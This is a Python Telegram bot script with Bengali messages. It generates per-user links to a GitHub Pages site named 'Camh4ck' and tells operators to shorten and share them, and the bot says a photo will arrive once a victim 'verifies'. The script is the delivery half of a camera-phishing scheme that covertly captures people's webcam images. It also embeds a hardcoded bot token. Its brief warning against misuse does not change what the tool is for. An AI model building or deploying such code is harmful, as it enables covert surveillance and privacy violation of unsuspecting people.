import telebot
from telebot import types

# আপনার বোট টোকেন
BOT_TOKEN = "8403844691:AAG7ui2mJ08X8Q5kQ5jhpNoq1PGUqZpx6Ec"
bot = telebot.TeleBot(BOT_TOKEN)

# আপনার GitHub ওয়েবসাইটের লিঙ্ক
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

# মেইন বাটন তৈরির ফাংশন
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('/start')
    itembtn2 = types.KeyboardButton('/link')
    markup.add(itembtn1, itembtn2)
    return markup

# /start কমান্ড দিলে যা হবে
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.from_user.first_name
    welcome_text = (
        f"হ্যালো {user_name}!\n"
        "Welcome to 50/50 bot\n\n"
        "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n\n"
        "নিচের বাটন থেকে আপনার লিঙ্ক তৈরি করুন।"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())

# /link কমান্ড দিলে যা হবে
@bot.message_handler(commands=['link'])
def send_link(message):
    user_id = message.chat.id
    personal_link = f"{BASE_URL}?id={user_id}"
    
    # আপনার অনুরোধ অনুযায়ী মেসেজ ফরম্যাট
    response_text = (
        "✅ আপনার ভেরিফিকেশন লিঙ্ক তৈরি হয়েছে।\n\n"
        f"🔗 লিঙ্ক: {personal_link}\n\n"
        "লিংকটি ছোটো করুন\n"
        "https://lc.cx/en\n\n"
        "এই লিঙ্কটি শেয়ার করুন। কেউ ভেরিফাই করলে ছবি এখানে আসবে।"
    )
    bot.send_message(user_id, response_text, reply_markup=main_keyboard())

# বোট সচল রাখা
print("বোটটি সচল আছে...")
bot.polling(none_stop=True)
